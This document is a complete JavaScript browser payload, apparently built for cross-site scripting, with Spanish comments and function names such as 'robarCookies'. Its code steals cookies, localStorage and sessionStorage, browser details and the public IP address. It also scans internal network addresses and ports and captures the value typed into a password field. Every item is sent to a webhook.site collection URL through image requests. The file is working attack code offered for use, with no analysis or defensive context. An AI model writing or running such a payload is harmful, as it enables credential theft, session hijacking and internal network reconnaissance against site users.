
// =======================
// payload.js (con reintento de password y sin rutas extra)
// =======================

const EXFIL_BASE = 'https://webhook.site/90e1ad6d-3d2e-48a9-8c70-e9e76d9ea291';

// Enviar datos usando Image para evitar CORS
function exfiltrar(tipo, contenido) {
  const img = new Image();
  const url = `${EXFIL_BASE}?tipo=${encodeURIComponent(tipo)}&data=${encodeURIComponent(JSON.stringify(contenido))}`;
  img.src = url;
}

// 1. Cookies
function robarCookies() {
  if (document.cookie) {
    exfiltrar('cookies', document.cookie);
  }
}

// 2. Storage
function robarStorage() {
  exfiltrar('storage', {
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage}
  });
}

// 3. Info del navegador
function infoNavegador() {
  exfiltrar('navegador', {
    location: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language
  });
}

// 4. IP pública
function obtenerIPPublica() {
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => exfiltrar('ip_publica', data.ip))
    .catch(() => {});
}

// 5. Escaneo de red interna
function escanearRedInterna() {
  const ips = [
    '192.168.0.1', '192.168.1.1', '10.0.0.1', '10.0.0.2',
    '172.16.0.1', '172.17.0.1', '127.0.0.1', 'localhost'
  ];
  const puertos = [80, 443, 8080, 8443, 3000];

  ips.forEach(ip => {
    puertos.forEach(puerto => {
      const img = new Image();
      img.src = `http://${ip}:${puerto}/favicon.ico`;
      img.onload = () => {
        exfiltrar('puerto_abierto', `${ip}:${puerto}`);
      };
    });
  });
}

// 6. Robo de contraseña con reintento
function robarPasswordConReintento() {
  let intentos = 0;
  const maxIntentos = 5;

  function comprobarPasswordInput() {
    const input = document.querySelector('#password2');
    if (input && input.value && input.value.length > 0) {
      exfiltrar('password_input', {
        campo: '#password2',
        valor: input.value
      });
    } else if (intentos < maxIntentos) {
      intentos++;
      setTimeout(comprobarPasswordInput, 2000);
    }
  }

  setTimeout(comprobarPasswordInput, 2000);
}

// === Ejecutar módulos ===
robarCookies();
robarStorage();
infoNavegador();
obtenerIPPublica();
escanearRedInterna();
robarPasswordConReintento();
